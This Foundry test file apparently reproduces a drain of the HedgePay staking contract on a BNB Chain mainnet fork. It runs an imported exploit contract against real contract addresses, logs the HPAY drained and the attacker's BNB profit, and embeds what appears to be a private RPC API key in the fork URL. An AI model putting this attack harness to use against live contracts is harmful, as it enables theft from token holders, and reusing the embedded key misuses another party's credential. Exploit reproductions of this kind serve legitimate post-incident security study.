// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/HedgePayExploit.sol";

interface IERC20Balance {
    function balanceOf(address) external view returns (uint256);
}

contract HedgePayExploitTest is Test {
    address constant HPAY           = 0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A;
    address constant STAKING        = 0x6E30c17D2554DCA5A1Ac178939764c6Bf61AB95a;
    address constant PAIR_BTCB_HPAY = 0xF603ae6EF2Bf30EC77539279eFbE80e3e0e8e233;

    HedgePayExploit exploit;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(
            "https://empty-responsive-dust.bsc.quiknode.pro/e23a38740e04d46046cec18a524339abb3cc389f",
            83268461
        );
    }

    function test_exploit() public {
        uint256 stakingHpayBefore = IERC20Balance(HPAY).balanceOf(STAKING);
        uint256 pairHpayBefore    = IERC20Balance(HPAY).balanceOf(PAIR_BTCB_HPAY);

        console.log("======== BEFORE ATTACK ========");
        console.log("HPAY in Staking   :", stakingHpayBefore / 1e18, "HPAY");
        console.log("HPAY in Pair      :", pairHpayBefore / 1e18, "HPAY");
        console.log("Attacker BNB      :", attacker.balance / 1e18, "BNB");
        console.log("");

        vm.startPrank(attacker);
        exploit = new HedgePayExploit();
        exploit.attack();
        exploit.withdraw();
        vm.stopPrank();

        uint256 stakingHpayAfter = IERC20Balance(HPAY).balanceOf(STAKING);
        uint256 pairHpayAfter    = IERC20Balance(HPAY).balanceOf(PAIR_BTCB_HPAY);
        uint256 attackerProfit   = attacker.balance;

        console.log("======== AFTER ATTACK");
        console.log("HPAY in Staking   :", stakingHpayAfter / 1e18, "HPAY");
        console.log("HPAY in Pair      :", pairHpayAfter / 1e18, "HPAY");
        console.log("Attacker BNB      :", attackerProfit / 1e18, "BNB");
        console.log("");

        console.log("======== IMPACT");
        console.log("HPAY drained      :", (stakingHpayBefore - stakingHpayAfter) / 1e18, "HPAY");
        console.log("Net profit (BNB)  :", attackerProfit / 1e18, "BNB");
        console.log("Net profit (wei)  :", attackerProfit);

        assertGt(attackerProfit, 0, "attacker should have BNB profit");
        assertLt(stakingHpayAfter, stakingHpayBefore, "staking pool should be drained");
    }
}
